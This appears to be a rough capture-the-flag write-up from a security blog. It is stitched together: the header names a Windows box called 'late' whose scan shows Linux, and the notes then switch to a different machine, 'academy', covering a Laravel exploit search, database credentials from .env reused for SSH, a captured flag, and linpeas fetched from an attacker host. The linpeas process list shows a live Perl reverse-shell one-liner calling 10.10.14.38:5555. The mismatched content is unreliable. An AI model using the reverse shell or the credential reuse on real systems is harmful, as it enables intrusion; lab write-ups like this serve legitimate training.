[**slyone999’s Security Blog**] (https://slyone999.github.io)

[//]: # (# -- 5 spaces before)
[//]: # (## -- 4 spaces before)
[//]: # (### -- 3 spaces before)
[//]: # (#### -- 2 spaces before)
[//]: # (##### -- 1 space before)

* TOC
{:toc}

# Info#

| Machine Name | late |
| IP Address | 10.10.11.156 |
| OS | Windows |

# Recon

## NMap

nmap -p 1-65535 -T4 -A -v 10.10.11.156

```
nmap -p 1-65535 -T4 -A -v 10.10.11.156 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-01 19:23 BST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:23
Completed Parallel DNS resolution of 1 host. at 19:23, 0.02s elapsed
Initiating Connect Scan at 19:23
Scanning 10.10.11.156 [65535 ports]
Discovered open port 22/tcp on 10.10.11.156
Discovered open port 80/tcp on 10.10.11.156
Completed Connect Scan at 19:23, 29.12s elapsed (65535 total ports)
Initiating Service scan at 19:23
Scanning 2 services on 10.10.11.156
Completed Service scan at 19:23, 6.07s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.156.
Initiating NSE at 19:23
Completed NSE at 19:23, 1.18s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.14s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Nmap scan report for 10.10.11.156
Host is up (0.081s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.92 seconds


```


Couldn't login with the dbname, but what is the app key for? Laravel 

SearchSploit brings back 

```
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
Laravel - 'Hash::make()' Password Truncation Security        | multiple/remote/39318.txt
Laravel Log Viewer < 0.13.0 - Local File Download            | php/webapps/44343.py
PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unseri | linux/remote/47129.rb
UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read    | php/webapps/48166.txt
UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File  | php/webapps/46389.py
------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
What is the PHP one?


ssh -L 3306:127.0.0.1:33060 -N $homestead@$academy.htb

(this example uses local port 3307, in case you also have mysql running on your local machine and using the standard port 3306)

Now you should be ale to connect with

mysql -u $user -p -h 127.0.0.1 -P 3307


Found the following in ../../academy/.env 

DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!



Couldn't login on mysql or ssh.
Tried other userid that exist in /home 

```
21y4d
ch4p
cry0l1t3
egre55
g0blin
mrb3n
```

Succesful logged in ssh 
```
ssh cry0l1t3@academy 
password as mySup3rP4s5w0rd!!

cat user.txt 
```
The user key is 51c9996bae9d8151cf84686078a172c1


Try LinPeas to enum

```
wget 10.10.14.38/linpeas.sh
--2020-11-16 19:50:48--  http://10.10.14.38/linpeas.sh
Connecting to 10.10.14.38:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 297851 (291K) [text/x-sh]
linpeas.sh: Permission denied

Cannot write to ‘linpeas.sh’ (Permission denied).
$ ls
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var
$ cd /home
$ ls
21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
$ cd cry0l1t3
$ ls
user.txt
$ wget 10.10.14.38/linpeas.sh
--2020-11-16 19:51:32--  http://10.10.14.38/linpeas.sh
Connecting to 10.10.14.38:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 297851 (291K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                          100%[================================================================================================================>] 290.87K   502KB/s    in 0.6s    

2020-11-16 19:51:33 (502 KB/s) - ‘linpeas.sh’ saved [297851/297851]

$ ls
linpeas.sh  user.txt
$ ls -la          
total 324
drwxr-xr-x 4 cry0l1t3 cry0l1t3   4096 Nov 16 19:51 .
drwxr-xr-x 8 root     root       4096 Aug 10 00:34 ..
lrwxrwxrwx 1 root     root          9 Aug 10 23:41 .bash_history -> /dev/null
-rw-r--r-- 1 cry0l1t3 cry0l1t3    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 cry0l1t3 cry0l1t3   3771 Feb 25  2020 .bashrc
drwx------ 2 cry0l1t3 cry0l1t3   4096 Aug 12 21:58 .cache
-rw-rw-r-- 1 cry0l1t3 cry0l1t3 297851 Nov 16 19:42 linpeas.sh
drwxrwxr-x 3 cry0l1t3 cry0l1t3   4096 Aug 12 02:30 .local
-rw-r--r-- 1 cry0l1t3 cry0l1t3    807 Feb 25  2020 .profile
-r--r----- 1 cry0l1t3 cry0l1t3     33 Nov 16 18:55 user.txt
$ chmod 755 linpeas.sh
$ linpeas.sh
-sh: 29: linpeas.sh: not found
$ ./linpeas.sh
 Starting linpeas. Caching Writable Folders...

                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v2.9.1 by carlospolop
                                                                                                                                                                                                             
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                                                                                                  
                                                                                                                                                                                                             
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                     
  RED/YELLOW: 95% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username


====================================( Basic information )=====================================
OS: Linux version 5.4.0-52-generic (buildd@lgw01-amd64-060) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020                                                   
User & Groups: uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
Hostname: academy
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                            
                                                                                                                                                                                                             

Caching directories . . . . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================                                                                                                               
[+] Operative system                                                                                                                                                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                                                              
Linux version 5.4.0-52-generic (buildd@lgw01-amd64-060) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020                                                       
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.1 LTS
Release:        20.04
Codename:       focal

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                 
Sudo version 1.8.31                                                                                                                                                                                          

[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                                                         
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                                                                           
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

[+] Date
Mon 16 Nov 2020 07:52:37 PM UTC                                                                                                                                                                              

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                                                                             
udev            1.9G     0  1.9G   0% /dev
tmpfs           394M  1.1M  393M   1% /run
/dev/sda2        16G  7.0G  8.0G  47% /
tmpfs           2.0G     0  2.0G   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/loop0       55M   55M     0 100% /snap/core18/1705
/dev/loop1       69M   69M     0 100% /snap/lxd/14804
/dev/loop2       28M   28M     0 100% /snap/snapd/7264
tmpfs           394M     0  394M   0% /run/user/1002
              total        used        free      shared  buff/cache   available
Mem:        4030604      523180     2809388        9620      698036     3236860
Swap:       2097148           0     2097148

[+] CPU info
Architecture:                    x86_64                                                                                                                                                                      
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   43 bits physical, 48 bits virtual
CPU(s):                          2
On-line CPU(s) list:             0,1
Thread(s) per core:              1
Core(s) per socket:              1
Socket(s):                       2
NUMA node(s):                    1
Vendor ID:                       AuthenticAMD
CPU family:                      23
Model:                           1
Model name:                      AMD EPYC 7401P 24-Core Processor
Stepping:                        2
CPU MHz:                         2000.000
BogoMIPS:                        4000.00
Hypervisor vendor:               VMware
Virtualization type:             full
L1d cache:                       64 KiB
L1i cache:                       128 KiB
L2 cache:                        1 MiB
L3 cache:                        128 MiB
NUMA node0 CPU(s):               0,1
Vulnerability Itlb multihit:     Not affected
Vulnerability L1tf:              Not affected
Vulnerability Mds:               Not affected
Vulnerability Meltdown:          Not affected
Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via prctl and seccomp
Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user pointer sanitization
Vulnerability Spectre v2:        Mitigation; Full AMD retpoline, IBPB conditional, STIBP disabled, RSB filling
Vulnerability Srbds:             Not affected
Vulnerability Tsx async abort:   Not affected
Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl ts
                                 c_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm 
                                 sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succ
                                 or

[+] Environment
[i] Any private information inside environment variables?                                                                                                                                                    
HISTFILESIZE=0                                                                                                                                                                                               
USER=cry0l1t3
SSH_CLIENT=10.10.14.38 57018 22
XDG_SESSION_TYPE=tty
HOME=/home/cry0l1t3
MOTD_SHOWN=pam
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1002/bus
LOGNAME=cry0l1t3
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=14
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1002
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/sh
SSH_CONNECTION=10.10.14.38 57018 10.10.10.215 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                                                          
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found                                                                                                                                                           
[+] Execshield enabled? ............ Execshield Not Found                                                                                                                                                    
[+] SELinux enabled? ............... sestatus Not Found                                                                                                                                                      
[+] Is ASLR enabled? ............... Yes                                                                                                                                                                     
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (vmware)                                                                                                                                                            
[+] Is this a container? ........... No
[+] Any running containers? ........ No                                                                                                                                                                      
                                                                                                                                                                                                             

=========================================( Devices )==========================================
[+] Any sd*/disk* disk in /dev? (limit 20)                                                                                                                                                                   
disk                                                                                                                                                                                                         
sda
sda1
sda2

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                                                                  
/dev/disk/by-uuid/97b65f33-cd4d-4162-b67c-2b1187676c75 / ext4 defaults 0 0                                                                                                                                   
/swap.img       none    swap    sw      0       0


====================================( Available Software )====================================
[+] Useful software                                                                                                                                                                                          
/usr/bin/nc                                                                                                                                                                                                  
/usr/bin/netcat
/usr/bin/wget
/usr/bin/curl
/usr/bin/ping
/usr/bin/base64
/usr/bin/python3
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo
/snap/bin/lxc

[+] Installed Compiler
/snap/core18/1705/usr/share/gcc-8                                                                                                                                                                            
/usr/share/gcc-10
/usr/share/bash-completion/completions/gcc-5
/usr/share/bash-completion/completions/gcc-6
/usr/share/bash-completion/completions/gcc-7
/usr/share/bash-completion/completions/gcc-8


================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes                                                                                                                                                                                        
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                     
root           1  0.0  0.2 169700 11480 ?        Ss   18:54   0:01 /sbin/init maybe-ubiquity                                                                                                                 
root         371  0.0  0.8  72960 33304 ?        S<s  18:54   0:00 /lib/systemd/systemd-journald
root         401  0.0  0.1  21436  5604 ?        Ss   18:54   0:01 /lib/systemd/systemd-udevd
root        4592  0.0  0.0  21436  3180 ?        S    19:52   0:00  \_ /lib/systemd/systemd-udevd
systemd+     402  0.0  0.1  18596  7660 ?        Ss   18:54   0:00 /lib/systemd/systemd-networkd
root         545  0.0  0.4 345772 17992 ?        SLsl 18:54   0:01 /sbin/multipathd -d -s
root         582  0.0  0.0  11356  1704 ?        S<sl 18:54   0:00 /sbin/auditd
systemd+     586  0.0  0.3  24224 12376 ?        Ss   18:54   0:00 /lib/systemd/systemd-resolved
systemd+     587  0.0  0.1  90424  6376 ?        Ssl  18:54   0:00 /lib/systemd/systemd-timesyncd
root         611  0.0  0.2  47532 10440 ?        Ss   18:54   0:00 /usr/bin/VGAuthService
root         630  0.0  0.1 163380  7580 ?        Ssl  18:54   0:02 /usr/bin/vmtoolsd
root         765  0.0  0.1 235656  7552 ?        Ssl  18:54   0:00 /usr/lib/accountsservice/accounts-daemon
root         773  0.0  0.0   6812  3036 ?        Ss   18:54   0:00 /usr/sbin/cron -f
message+     781  0.0  0.1   7476  4652 ?        Ss   18:54   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         795  0.0  0.0  81960  3680 ?        Ssl  18:54   0:00 /usr/sbin/irqbalance --foreground
root         797  0.0  0.4  29064 18144 ?        Ss   18:54   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       803  0.0  0.1 224348  5152 ?        Ssl  18:54   0:00 /usr/sbin/rsyslogd -n -iNONE
root         817  0.0  0.8 869876 33672 ?        Ssl  18:54   0:00 /usr/lib/snapd/snapd
root         822  0.0  0.1  16852  7752 ?        Ss   18:54   0:00 /lib/systemd/systemd-logind
daemon[0m       832  0.0  0.0   3792  2232 ?        Ss   18:54   0:00 /usr/sbin/atd -f
root         899  0.0  0.5 200272 21444 ?        Ss   18:54   0:00 /usr/sbin/apache2 -k start
www-data    1023  0.0  0.7 203016 28960 ?        S    18:54   0:00  \_ /usr/sbin/apache2 -k start
www-data    1024  0.0  0.6 200828 26176 ?        S    18:54   0:00  \_ /usr/sbin/apache2 -k start
www-data    1025  0.0  0.2 200772 10752 ?        S    18:54   0:00  \_ /usr/sbin/apache2 -k start
www-data    1026  0.0  0.2 200716  9432 ?        S    18:54   0:00  \_ /usr/sbin/apache2 -k start
www-data    1029  0.0  0.2 200716  9432 ?        S    18:54   0:00  \_ /usr/sbin/apache2 -k start
www-data    1169  0.0  0.2 200716  9432 ?        S    18:55   0:00  \_ /usr/sbin/apache2 -k start
root         972  0.0  0.0   5828  1864 tty1     Ss+  18:54   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         981  0.0  0.1 232716  6808 ?        Ssl  18:54   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         987  0.0  0.5 107888 20816 ?        Ssl  18:54   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
cry0l1t3    2260  0.0  0.1  14060  6032 ?        S    19:27   0:00      \_ sshd: cry0l1t3@pts/0
cry0l1t3    2263  0.0  0.0   2608  1692 pts/0    Ss   19:27   0:00          \_ -sh
cry0l1t3    4015  0.0  0.0   3028  2132 pts/0    S+   19:52   0:00              \_ /bin/sh ./linpeas.sh
cry0l1t3    4634  0.0  0.0   3028   572 pts/0    S+   19:52   0:00                  \_ /bin/sh ./linpeas.sh
cry0l1t3    4637  0.0  0.0   9044  3316 pts/0    R+   19:52   0:00                  |   \_ ps faux
mysql       1048  0.1  8.9 1740864 361912 ?      Ssl  18:54   0:05 /usr/sbin/mysqld
www-data    1163  0.0  0.1  11872  7116 ?        S    18:55   0:00 perl -MIO -e $p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.38:5555");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};
cry0l1t3    2149  0.0  0.2  18580  9748 ?        Ss   19:27   0:00 /lib/systemd/systemd --user
cry0l1t3    2158  0.0  0.0 171056  3580 ?        S    19:27   0:00  \_ (sd-pam)

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                                    
   0 lrwxrwxrwx 1 root root    4 Apr 23  2020 /bin/sh -> dash                                                                                                                                                
1.6M -rwxr-xr-x 1 root root 1.6M Oct  8 20:14 /lib/systemd/systemd
160K -rwxr-xr-x 1 root root 159K Oct  8 20:14 /lib/systemd/systemd-journald
264K -rwxr-xr-x 1 root root 263K Oct  8 20:14 /lib/systemd/systemd-logind
2.2M -rwxr-xr-x 1 root root 2.2M Oct  8 20:14 /lib/systemd/systemd-networkd
404K -rwxr-xr-x 1 root root 403K Oct  8 20:14 /lib/systemd/systemd-resolved
 56K -rwxr-xr-x 1 root root  55K Oct  8 20:14 /lib/systemd/systemd-timesyncd
724K -rwxr-xr-x 1 root root 723K Oct  8 20:14 /lib/systemd/systemd-udevd
 68K -rwxr-xr-x 1 root root  68K Jul 21 07:49 /sbin/agetty
112K -rwxr-xr-x 1 root root 111K Feb 18  2020 /sbin/auditd
   0 lrwxrwxrwx 1 root root   20 Oct  8 20:14 /sbin/init -> /lib/systemd/systemd
128K -rwxr-xr-x 1 root root 127K Apr  6  2020 /sbin/multipathd
244K -rwxr-xr-x 1 root root 244K Jun 11 18:22 /usr/bin/dbus-daemon[0m
   0 lrwxrwxrwx 1 root root    9 Mar 13  2020 /usr/bin/python3 -> python3.8
140K -rwxr-xr-x 1 root root 139K Jun 22 06:40 /usr/bin/VGAuthService
 64K -rwxr-xr-x 1 root root  63K Jun 22 06:40 /usr/bin/vmtoolsd
200K -rwxr-xr-x 1 root root 199K Nov  2 17:03 /usr/lib/accountsservice/accounts-daemon
120K -rwxr-xr-x 1 root root 119K Aug 16  2019 /usr/lib/policykit-1/polkitd
 27M -rwxr-xr-x 1 root root  27M Oct  8 07:30 /usr/lib/snapd/snapd
692K -rwxr-xr-x 1 root root 689K Aug 12 19:46 /usr/sbin/apache2
 32K -rwxr-xr-x 1 root root  31K Nov 12  2018 /usr/sbin/atd
 56K -rwxr-xr-x 1 root root  55K Feb 13  2020 /usr/sbin/cron
 64K -rwxr-xr-x 1 root root  63K Feb 13  2020 /usr/sbin/irqbalance
 64M -rwxr-xr-x 1 root root  64M Oct 22 13:19 /usr/sbin/mysqld
712K -rwxr-xr-x 1 root root 711K Aug  4 16:19 /usr/sbin/rsyslogd

[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                                                              
gdm-password Not Found                                                                                                                                                                                       
gnome-keyring-daemon Not Found                                                                                                                                                                               
lightdm Not Found                                                                                                                                                                                            
vsftpd Not Found                                                                                                                                                                                             
apache2 process found (dump creds from memory as root)                                                                                                                                                       
sshd: process found (dump creds from memory as root)

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                                                                          
-rw-r--r-- 1 root root 1042 Feb 13  2020 /etc/crontab                                                                                                                                                        

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Aug  7 14:33 .
drwxr-xr-x 98 root root 4096 Nov  5 12:55 ..
-rw-r--r--  1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--  1 root root  712 Mar 27  2020 php
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--  1 root root  191 Apr 23  2020 popularity-contest

/etc/cron.daily:
total 56
drwxr-xr-x  2 root root 4096 Nov  5 12:54 .
drwxr-xr-x 98 root root 4096 Nov  5 12:55 ..
-rwxr-xr-x  1 root root  539 Apr 13  2020 apache2
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x  1 root root  543 Jul 16  2019 mlocate
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 98 root root 4096 Nov  5 12:55 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 98 root root 4096 Nov  5 12:55 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 98 root root 4096 Nov  5 12:55 ..
-rwxr-xr-x  1 root root  813 Feb 25  2020 man-db
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  211 Apr  2  2020 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[+] Services
[i] Search for outdated versions                                                                                                                                                                             
 [ - ]  apache-htcacheclean                                                                                                                                                                                  
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ + ]  auditd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ - ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ - ]  lvm2-lvmpolld
 [ + ]  multipath-tools
 [ + ]  mysql
 [ + ]  networking
 [ - ]  open-iscsi
 [ + ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                                                                  
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                                                  

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                                                                                                                     
/etc/systemd/system/multi-user.target.wants/atd.service is executing some relative path                                                                                                                      
/lib/systemd/system/atd.service is executing some relative path
/lib/systemd/system/initrd-cleanup.service is executing some relative path
/lib/systemd/system/initrd-parse-etc.service is executing some relative path
/lib/systemd/system/initrd-switch-root.service is executing some relative path
/lib/systemd/system/initrd-udevadm-cleanup-db.service is executing some relative path
/lib/systemd/system/mdmonitor-oneshot.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-udevd.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service is executing some relative path
/lib/systemd/system/systemd-ask-password-console.service is executing some relative path
/lib/systemd/system/systemd-ask-password-wall.service is executing some relative path
/lib/systemd/system/systemd-boot-system-token.service is executing some relative path
/lib/systemd/system/systemd-halt.service is executing some relative path
/lib/systemd/system/systemd-hwdb-update.service is executing some relative path
/lib/systemd/system/systemd-journal-flush.service is executing some relative path
/lib/systemd/system/systemd-kexec.service is executing some relative path
/lib/systemd/system/systemd-machine-id-commit.service is executing some relative path
/lib/systemd/system/systemd-sysusers.service is executing some relative path
